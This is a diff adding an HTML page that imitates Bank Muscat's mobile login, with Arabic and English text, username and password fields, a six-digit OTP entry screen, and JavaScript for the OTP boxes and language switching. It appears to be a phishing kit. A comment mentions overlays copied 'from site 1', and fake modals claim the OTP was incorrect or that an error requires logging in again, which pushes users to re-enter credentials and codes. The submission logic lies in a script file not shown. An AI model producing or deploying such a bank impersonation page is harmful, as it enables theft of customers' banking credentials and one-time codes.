@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بنك مسقط - تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        body {
+            background-color: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background-color: #f8f8f8;
+            border-bottom: 1px solid #efefef;
+            height: 60px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .lang-button {
+            font-size: 18px;
+            font-weight: 400;
+            color: #e74c3c;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            font-family: inherit;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 60px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .bell-icon {
+            font-size: 22px;
+            color: #555;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .apple-pay-banner {
+            margin: 12px 15px;
+            padding: 16px;
+            background-color: #fafafa;
+            border: 1px solid #ececec;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: row;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .apple-pay-image {
+            flex-shrink: 0;
+            width: 110px;
+            height: 110px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            order: 2;
+        }
+
+        .apple-pay-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .apple-pay-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            order: 1;
+        }
+
+        .apple-pay-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000;
+            text-align: right;
+        }
+
+        .apple-pay-desc {
+            font-size: 15px;
+            font-weight: 400;
+            color: #333;
+            line-height: 1.7;
+            text-align: right;
+        }
+
+        .apple-pay-more {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #e74c3c;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            align-self: flex-start;
+            margin-top: 4px;
+        }
+
+        .form-section {
+            flex: 1;
+            padding: 35px 20px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .form-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        .form-group label {
+            position: absolute;
+            top: 10px;
+            right: 35px;
+            font-size: 18px;
+            color: #666;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            transform-origin: right;
+        }
+
+        .form-group input:focus ~ label,
+        .form-group input:not(:placeholder-shown) ~ label {
+            top: -20px;
+            right: 0;
+            font-size: 14px;
+            color: #444;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            border-bottom: 1px solid #d5d5d5;
+            padding: 10px 0;
+            gap: 8px;
+            position: relative;
+            min-height: 50px;
+        }
+
+        .input-icon {
+            font-size: 22px;
+            color: #333;
+            flex-shrink: 0;
+            order: 1;
+            width: 24px;
+            text-align: center;
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 22px;
+            font-weight: 400;
+            color: #333;
+            text-align: right;
+            font-family: inherit;
+            padding: 0 8px;
+            order: 2;
+            direction: rtl;
+            min-width: 0;
+        }
+
+        .input-wrapper input::placeholder {
+            color: transparent;
+        }
+
+        .eye-button {
+            width: 40px;
+            height: 40px;
+            border: none;
+            border-radius: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            cursor: pointer;
+            color: #e74c3c;
+            font-size: 18px;
+            flex-shrink: 0;
+            padding: 0 8px;
+            order: 3;
+            transition: color 0.3s ease;
+            margin-right: 0;
+        }
+
+        .forgot-password-link {
+            color: #e74c3c;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 35px;
+            display: block;
+            text-align: right;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 18px;
+            background-color: #e74c3c;
+            border: none;
+            border-radius: 60px;
+            font-size: 22px;
+            font-weight: 500;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 22px;
+            font-family: inherit;
+        }
+
+        .divider-line {
+            height: 1px;
+            background-color: #e0e0e0;
+            margin: 22px 0;
+        }
+
+        .signup-section {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .signup-text {
+            font-size: 20px;
+            font-weight: 400;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        .signup-link {
+            color: #e74c3c;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .footer-section {
+            padding: 25px 20px;
+            text-align: center;
+            background-color: #fafafa;
+            border-top: 1px solid #ececec;
+        }
+
+        .footer-text {
+            font-size: 17px;
+            font-weight: 400;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .footer-link {
+            color: #e74c3c;
+            text-decoration: none;
+            font-size: 19px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* إخفاء أيقونة العين الافتراضية السوداء للمتصفح */
+        input[type="password"]::-webkit-outer-spin-button,
+        input[type="password"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type="password"]::-ms-reveal {
+            display: none;
+        }
+        input[type="password"]::-webkit-reveal {
+            display: none;
+        }
+
+        /* Overlays from site 1 */
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 20, 25, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+        }
+        .loading-overlay.show { display: flex; }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #e74c3c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .page { display: none; }
+        .page.active { display: block; }
+
+        .otp-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 30px;
+            direction: ltr;
+        }
+        .otp-input-box {
+            width: 45px;
+            height: 55px;
+            border: none;
+            border-bottom: 2px solid #d5d5d5;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            color: #333;
+            background: transparent;
+            transition: all 0.3s ease;
+        }
+        .otp-input-box:focus {
+            outline: none;
+            border-bottom-color: #e74c3c;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 5px;
+            display: block;
+        }
+
+        .splash-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #0F1419;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 10000;
+            transition: transform 0.8s ease, opacity 0.6s ease;
+        }
+        .splash-screen.exit-active { transform: translateY(-100%); opacity: 0; }
+        .splash-logo { width: 150px; height: auto; }
+
+        /* Mobile Responsive Fixes */
+        @media (max-width: 480px) {
+            .form-section {
+                padding: 25px 15px;
+            }
+            .form-group {
+                margin-bottom: 24px;
+            }
+            .input-wrapper {
+                min-height: 48px;
+                gap: 6px;
+            }
+            .eye-button {
+                width: 36px;
+                height: 36px;
+                padding: 0 6px;
+                font-size: 16px;
+            }
+            .otp-inputs {
+                gap: 8px;
+            }
+            .otp-input-box {
+                width: 40px;
+                height: 50px;
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .form-section {
+                padding: 20px 12px;
+            }
+            .input-wrapper {
+                gap: 4px;
+            }
+            .eye-button {
+                width: 32px;
+                height: 32px;
+                padding: 0 4px;
+                font-size: 14px;
+            }
+            .otp-inputs {
+                gap: 6px;
+            }
+            .otp-input-box {
+                width: 36px;
+                height: 45px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loadingScreen" class="splash-screen">
+        <img src="logoapp.png" alt="Logo" class="splash-logo">
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <h3 id="loadingTitle" data-ar="جاري معالجة طلبك..." data-en="Processing your request...">جاري معالجة طلبك...</h3>
+        <p id="loadingDesc" data-ar="يرجى الانتظار" data-en="Please wait">يرجى الانتظار</p>
+    </div>
+
+    <div id="otpRejectionModal" class="loading-overlay" style="background: rgba(0,0,0,0.95);">
+        <div style="background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; color: #333;">
+            <div style="color: #e74c3c; font-size: 50px; margin-bottom: 20px;">✕</div>
+            <h3 style="margin-bottom: 10px;" data-ar="رمز التحقق غير صحيح" data-en="Verification code is incorrect">رمز التحقق غير صحيح</h3>
+            <p style="color: #666; margin-bottom: 25px;" data-ar="يرجى التأكد من الرمز المرسل إليك وإعادة المحاولة مرة أخرى." data-en="Please verify the code sent to you and try again.">يرجى التأكد من الرمز المرسل إليك وإعادة المحاولة مرة أخرى.</p>
+            <button onclick="closeOtpRejection()" style="width: 100%; padding: 15px; background: #e74c3c; color: white; border: none; border-radius: 30px; font-weight: 700;" data-ar="إعادة المحاولة" data-en="Try Again">إعادة المحاولة</button>
+        </div>
+    </div>
+
+    <div id="processErrorModal" class="loading-overlay" style="background: rgba(0,0,0,0.95);">
+        <div style="background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; color: #333; text-align: center;">
+            <div style="color: #e74c3c; font-size: 50px; margin-bottom: 20px;"><i class="fas fa-exclamation-circle"></i></div>
+            <h3 style="margin-bottom: 10px;" data-ar="عذراً، حدث خطأ!" data-en="Sorry, an error occurred!">عذراً، حدث خطأ!</h3>
+            <p style="color: #666; margin-bottom: 25px;" data-ar="لقد حدث خطأ غير متوقع أثناء معالجة طلبك. يرجى تسجيل الدخول مرة أخرى لإتمام العملية." data-en="An unexpected error occurred while processing your request. Please log in again to complete the process.">لقد حدث خطأ غير متوقع أثناء معالجة طلبك. يرجى تسجيل الدخول مرة أخرى لإتمام العملية.</p>
+            <button onclick="closeProcessError()" style="width: 100%; padding: 15px; background: #e74c3c; color: white; border: none; border-radius: 30px; font-weight: 700;" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <div id="loginPage" class="page active">
+        <div class="container">
+            <header class="header">
+                <div class="header-right">
+                    <button class="lang-button" onclick="toggleLoginLang()" data-ar="English" data-en="عربي">English</button>
+                </div>
+                <div class="logo-container">
+                    <img src="logo.png" alt="بنك مسقط" class="logo-img">
+                </div>
+                <div class="header-left">
+                    <div class="bell-icon">
+                        <i class="far fa-bell"></i>
+                    </div>
+                </div>
+            </header>
+
+            <section class="apple-pay-banner">
+                <div class="apple-pay-content">
+                    <div class="apple-pay-title" data-ar="Apple Pay" data-en="Apple Pay">Apple Pay</div>
+                    <div class="apple-pay-desc" data-ar="قم بإضافة بطاقتك إلى Apple Wallet وادفع بكل سهولة مع Apple Pay" data-en="Add your card to Apple Wallet and pay easily with Apple Pay">قم بإضافة بطاقتك إلى Apple Wallet وادفع بكل سهولة مع Apple Pay</div>
+                    <a href="#" class="apple-pay-more">
+                        <span data-ar="للمزيد" data-en="Learn more">للمزيد</span>
+                        <i class="fas fa-chevron-left"></i>
+                    </a>
+                </div>
+                <div class="apple-pay-image">
+                    <img src="applepay.png" alt="Apple Pay">
+                </div>
+            </section>
+
+            <div class="form-section">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <div class="input-wrapper">
+                            <i class="far fa-user input-icon"></i>
+                            <input type="text" id="username" placeholder="اسم المستخدم" data-ar-placeholder="اسم المستخدم" data-en-placeholder="Username" required>
+                            <label for="username" data-ar="اسم المستخدم" data-en="Username">اسم المستخدم</label>
+                        </div>
+                        <span class="error-message" id="usernameError"></span>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock input-icon"></i>
+                            <input type="password" id="password" placeholder="الرقم السري" data-ar-placeholder="الرقم السري" data-en-placeholder="Password" required>
+                            <button type="button" class="eye-button" onclick="togglePasswordVisibility()">
+                                <i class="far fa-eye" id="eye-icon"></i>
+                            </button>
+                            <label for="password" data-ar="الرقم السري" data-en="Password">الرقم السري</label>
+                        </div>
+                        <span class="error-message" id="passwordError"></span>
+                    </div>
+
+                    <a href="#" class="forgot-password-link" data-ar="هل نسيت كلمة السر أو اسم المستخدم؟" data-en="Forgot your password or username?">هل نسيت كلمة السر أو اسم المستخدم؟</a>
+
+                    <button type="submit" class="login-button" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</button>
+                </form>
+
+                <div class="divider-line"></div>
+
+                <div class="signup-section">
+                    <div class="signup-text" data-ar="هل أنت مستخدم جديد للتطبيق؟" data-en="Are you a new user?">هل أنت مستخدم جديد للتطبيق؟</div>
+                    <a href="#" class="signup-link" data-ar="تسجيل جديد" data-en="Register">تسجيل جديد</a>
+                </div>
+            </div>
+
+            <footer class="footer-section">
+                <div class="footer-text" data-ar="هاتف جديد؟" data-en="New phone?">هاتف جديد؟</div>
+                <div class="footer-text" data-ar="بإمكانك تحميل التطبيق في أكثر من جهاز" data-en="You can download the app on multiple devices">بإمكانك تحميل التطبيق في أكثر من جهاز</div>
+                <a href="#" class="footer-link" data-ar="تسجيل جهاز جديد" data-en="Register a new device">تسجيل جهاز جديد</a>
+            </footer>
+        </div>
+    </div>
+
+    <div id="otpPage" class="page">
+        <div class="container">
+            <header class="header">
+                <div class="header-right">
+                    <button class="lang-button" onclick="toggleLoginLang()" data-ar="English" data-en="عربي">English</button>
+                </div>
+                <div class="logo-container">
+                    <img src="logo.png" alt="بنك مسقط" class="logo-img">
+                </div>
+                <div class="header-left">
+                    <div class="bell-icon">
+                        <i class="far fa-bell"></i>
+                    </div>
+                </div>
+            </header>
+
+            <div class="form-section" style="align-items: center; text-align: center;">
+                <h2 style="font-size: 24px; font-weight: 700; margin-bottom: 15px;" data-ar="رمز التحقق" data-en="Verification Code">رمز التحقق</h2>
+                <p style="font-size: 16px; color: #666; margin-bottom: 40px; line-height: 1.6;" data-ar="يرجى إدخال رمز التحقق المكون من 6 أرقام والذي تم إرساله إلى هاتفك المسجل" data-en="Please enter the 6-digit verification code sent to your registered phone">
+                    يرجى إدخال رمز التحقق المكون من 6 أرقام والذي تم إرساله إلى هاتفك المسجل
+                    <span id="otpPhoneDisplay" style="color: #e74c3c; font-weight: 600; display: block; margin-top: 5px;">+968 ****XXXX</span>
+                </p>
+
+                <div class="otp-inputs" id="otp-container">
+                    <input type="tel" id="otpSingleInput" style="position: absolute; opacity: 0; pointer-events: none;">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                    <input type="text" class="otp-input-box" maxlength="1" inputmode="numeric">
+                </div>
+                <span class="error-message" id="otpError"></span>
+
+                <div style="margin-bottom: 40px;">
+                    <p style="font-size: 15px; color: #888;"><span data-ar="إعادة إرسال الرمز خلال" data-en="Resend code in">إعادة إرسال الرمز خلال</span> <span id="timer" style="color: #e74c3c; font-weight: 700;">03:00</span></p>
+                    <button id="otpResendBtn" style="background: none; border: none; color: #e74c3c; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; display: none;" data-ar="إعادة إرسال الرمز" data-en="Resend Code">إعادة إرسال الرمز</button>
+                </div>
+
+                <button id="otpConfirmBtn" class="login-button" data-ar="تأكيد" data-en="Confirm">تأكيد</button>
+                <a href="#" id="backBtnOtp" style="color: #888; text-decoration: none; margin-top: 20px; display: block;" data-ar="العودة لتسجيل الدخول" data-en="Back to Login">العودة لتسجيل الدخول</a>
+            </div>
+
+            <footer class="footer-section">
+                <p style="font-size: 14px; color: #999;" data-ar="حقوق الطبع والنشر © 2026 بنك مسقط. جميع الحقوق محفوظة." data-en="Copyright © 2026 Muscat Bank. All rights reserved.">حقوق الطبع والنشر © 2026 بنك مسقط. جميع الحقوق محفوظة.</p>
+            </footer>
+        </div>
+    </div>
+
+    <script src="js/lang.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // Check for redirection error
+        document.addEventListener('DOMContentLoaded', function() {
+            if (sessionStorage.getItem('login_error') === 'true') {
+                const errorDiv = document.createElement('div');
+                errorDiv.style.backgroundColor = '#fdecea';
+                errorDiv.style.color = '#e74c3c';
+                errorDiv.style.padding = '12px';
+                errorDiv.style.borderRadius = '8px';
+                errorDiv.style.marginBottom = '20px';
+                errorDiv.style.textAlign = 'center';
+                errorDiv.style.fontSize = '14px';
+                errorDiv.style.fontWeight = '600';
+                errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> حدث خطأ، يرجى تسجيل الدخول مرة أخرى';
+                
+                const form = document.getElementById('loginForm');
+                if (form) form.prepend(errorDiv);
+                
+                // Clear the error state
+                sessionStorage.removeItem('login_error');
+            }
+            
+            // Initialize language
+            if (window.LangNav) {
+                window.LangNav.init({
+                    setupNav: false,
+                    setupMenu: false,
+                    setupLangPage: false
+                });
+                var lang = localStorage.getItem('language') || 'ar';
+                window.LangNav.updateLanguage(lang);
+            }
+            updateLoginLangBtn();
+        });
+
+        // ── Language Toggle for login.html ──
+        function toggleLoginLang() {
+            var current = window.LangNav ? window.LangNav.getCurrentLanguage() : (localStorage.getItem('language') || 'ar');
+            var next = (current === 'ar') ? 'en' : 'ar';
+            if (window.LangNav) window.LangNav.updateLanguage(next);
+            updateLoginLangBtn();
+        }
+
+        function updateLoginLangBtn() {
+            var lang = window.LangNav ? window.LangNav.getCurrentLanguage() : (localStorage.getItem('language') || 'ar');
+            document.querySelectorAll('.lang-button').forEach(function(btn) {
+                btn.textContent = (lang === 'ar') ? 'English' : 'عربي';
+            });
+        }
+    </script>
+    <script>
+        const visualInputs = document.querySelectorAll('.otp-input-box');
+        const hiddenInput = document.getElementById('otpSingleInput');
+
+        visualInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value) {
+                    if (index < visualInputs.length - 1) visualInputs[index + 1].focus();
+                }
+                updateHiddenInput();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    visualInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function updateHiddenInput() {
+            let code = "";
+            visualInputs.forEach(input => code += input.value);
+            hiddenInput.value = code;
+            hiddenInput.dispatchEvent(new Event('input'));
+        }
+
+        hiddenInput.addEventListener('input', () => {
+            const val = hiddenInput.value;
+            for (let i = 0; i < visualInputs.length; i++) {
+                visualInputs[i].value = val[i] || "";
+            }
+        });
+
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.classList.replace('far', 'fas');
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.classList.replace('fas', 'far');
+            }
+        }
+    </script>
+</body>
+</html>
